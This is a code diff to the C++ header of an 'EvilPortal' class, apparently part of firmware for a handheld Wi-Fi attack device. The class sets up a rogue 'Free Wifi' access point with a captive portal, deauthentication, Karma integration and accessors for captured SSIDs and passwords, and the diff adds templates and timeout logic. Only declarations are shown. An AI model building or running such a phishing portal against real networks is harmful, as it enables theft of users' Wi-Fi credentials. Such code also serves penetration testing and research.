@@ -19,30 +19,35 @@ class EvilPortal {
     };
 
 public:
-    // Constructor with background mode support
     EvilPortal(
         String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false,
-        bool autoMode = false, bool backgroundMode = false
+        bool autoMode = false, bool backgroundMode = false, String templateFile = ""
     );
     ~EvilPortal();
 
     bool setup(void);
     void beginAP(void);
     void setupRoutes(void);
-    void loop(void);            // Full UI loop (foreground mode)
-    void processRequests(void); // Lightweight heartbeat (background mode)
+    void loop(void);
+    void processRequests(void);
 
-    // Karma Integration Methods
     bool hasCredentials();
     String getCapturedSSID();
     String getCapturedPassword();
 
-    // Background mode accessors
-    DNSServer &getDNSServer() { return dnsServer; }
+    DNSServer &getDNSServer() { return *dnsServer; }
     AsyncWebServer &getWebServer() { return webServer; }
     String getApName() { return apName; }
     uint8_t getChannel() { return _channel; }
     bool isBackgroundMode() { return _backgroundMode; }
+
+    void setBaseDuration(uint16_t seconds);
+    void setExtendedDuration(uint16_t seconds);
+    void checkAndExtendDuration();
+    bool hasRecentActivity();
+    bool hasRecentPageView();
+    void recordPageView();
+    bool shouldTerminate();
 
 private:
     String apName = "Free Wifi";
@@ -51,15 +56,15 @@ private:
     bool isDeauthHeld = false;
     bool _verifyPwd;
     bool _autoMode;
-    bool _backgroundMode; // New flag for background operation
-    
-    // WiFi state tracking - store original mode before portal starts
+    bool _backgroundMode;
+    String _autoTemplateFile;
+
     wifi_mode_t _originalWifiMode;
     bool _wifiWasConnected;
-    
+
     AsyncWebServer webServer;
 
-    DNSServer dnsServer;
+    DNSServer *dnsServer = nullptr;
     IPAddress apGateway;
 
     String outputFile = "default_creds.csv";
@@ -74,9 +79,16 @@ private:
     int previousTotalCapturedCredentials = -1;
     String capturedCredentialsHtml = "";
     bool verifyPass = false;
+    bool _pendingWifiRestart = false;
 
-    // Track handler for cleanup
     CaptiveRequestHandler *_captiveHandler = nullptr;
+
+    uint16_t _baseDurationSec = 15;
+    uint16_t _extendedDurationSec = 60;
+    unsigned long _lastActivityTime = 0;
+    bool _durationExtended = false;
+    unsigned long _launchTime = 0;
+    unsigned long _lastPageViewTime = 0;
 
     void portalController(AsyncWebServerRequest *request);
     void credsController(AsyncWebServerRequest *request);
@@ -87,13 +99,14 @@ private:
     void printDeauthStatus(void);
     void printLastCapturedCredential(void);
     void loadCustomHtml(void);
+    bool loadCustomHtmlFromPath(const String &path);
     void loadDefaultHtml(void);
     void loadDefaultHtml_one(void);
     String wifiLoadPage(void);
     void saveToCSV(const String &csvLine, bool IsAPname = false);
     void drawScreen(void);
 
-    String getHtmlTemplate(String body);
+    String getHtmlTemplate(const String &body);
     String creds_GET(void);
     String ssid_GET(void);
     String ssid_POST(void);
